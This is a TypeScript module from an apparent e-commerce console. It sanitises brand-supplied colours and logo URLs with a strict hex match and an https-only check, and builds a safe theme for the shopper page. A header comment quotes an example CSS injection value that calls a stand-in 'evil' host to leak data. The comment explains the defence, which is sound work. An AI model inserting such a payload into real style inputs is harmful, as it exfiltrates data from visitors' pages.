import type { Brand } from "@prisma/client";
import { PRODUCT_NAME } from "@/lib/product";

/**
 * The narrow gate between what a brand typed and what reaches a page.
 *
 * Every field here is eventually going to be set by a brand's own marketing
 * person through the console, which makes all of it attacker-controlled from
 * this file's point of view. Two of them are dangerous in ways that are easy
 * to miss:
 *
 *   - A colour lands in a `style` attribute. React escapes text, but a CSS
 *     value is not text: `red;background:url(https://evil/?c=` in a custom
 *     property is a real request off the page, and a value ending in a
 *     closing brace can escape the rule entirely. So a colour is not
 *     sanitised, it is *matched* — six hex digits or it does not exist.
 *
 *   - A logo lands in an `img src`. `javascript:` there is inert in modern
 *     browsers but `data:` is not, and an http:// URL on an https page is a
 *     mixed-content block that presents as a brand with no logo and nobody
 *     knowing why. So: absolute https, or it does not exist.
 *
 * In both cases an invalid value degrades to absent. A brand that pastes a
 * malformed colour gets Qumo's default black button, not a broken page and
 * not an error — the page a shopper is standing in a queue to read must
 * render whatever the brand's settings say.
 */

/** #rrggbb, lowercase or upper, and nothing else. No names, no rgb(), no #abc. */
const HEX = /^#[0-9a-fA-F]{6}$/;

export function safeColor(value: string | null | undefined): string | null {
  if (!value) return null;
  const trimmed = value.trim();
  return HEX.test(trimmed) ? trimmed.toLowerCase() : null;
}

export function safeLogoUrl(value: string | null | undefined): string | null {
  if (!value) return null;
  try {
    const url = new URL(value.trim());
    return url.protocol === "https:" ? url.toString() : null;
  } catch {
    return null;
  }
}

/**
 * What the shopper surface renders, with every fallback already applied.
 *
 * A view model rather than the Brand row, so no page can accidentally read
 * an unvalidated field: the raw colour and logo columns are not on this
 * type at all.
 */
export type BrandTheme = {
  id: string;
  slug: string;
  /** Always present — falls back through displayName to name. */
  name: string;
  tagline: string | null;
  logoUrl: string | null;
  accent: string | null;
  accentInk: string | null;
  supportEmail: string | null;
  supportUrl: string | null;
};

type BrandIdentityFields = Pick<
  Brand,
  | "id"
  | "slug"
  | "name"
  | "displayName"
  | "tagline"
  | "logoUrl"
  | "accentColor"
  | "accentInkColor"
  | "supportEmail"
  | "supportUrl"
>;

export function toBrandTheme(brand: BrandIdentityFields): BrandTheme {
  const accent = safeColor(brand.accentColor);
  return {
    id: brand.id,
    slug: brand.slug,
    name: brand.displayName?.trim() || brand.name,
    tagline: brand.tagline?.trim() || null,
    logoUrl: safeLogoUrl(brand.logoUrl),
    accent,
    // Ink without an accent is meaningless and, worse, actively harmful: it
    // would recolour the default black button's text and could land white on
    // white. It only exists in relation to the accent, so it only survives
    // in relation to it.
    accentInk: accent ? safeColor(brand.accentInkColor) : null,
    supportEmail: brand.supportEmail?.trim() || null,
    supportUrl: safeLogoUrl(brand.supportUrl),
  };
}

/**
 * The accent as CSS custom properties for the shopper surface.
 *
 * It overrides exactly two tokens — the primary button and its ink — and
 * that is the whole reskin. The shopper stylesheet was already written
 * against tokens rather than literal colours, so a brand does not get to
 * restyle the page; it gets to own the one element that says what happens
 * next. Type stays black on white, contrast stays predictable, and a brand
 * with a terrible palette cannot make its own programme unreadable.
 */
export function accentStyle(theme: BrandTheme | null): React.CSSProperties | undefined {
  if (!theme?.accent) return undefined;
  return {
    ["--sc-btn" as string]: theme.accent,
    ...(theme.accentInk ? { ["--sc-btn-ink" as string]: theme.accentInk } : {}),
  };
}

/** Who the shopper is dealing with, in the page title. */
export function brandTitle(theme: BrandTheme | null, caption?: string): string {
  const lead = theme?.name ?? PRODUCT_NAME;
  return caption ? `${caption} · ${lead}` : lead;
}
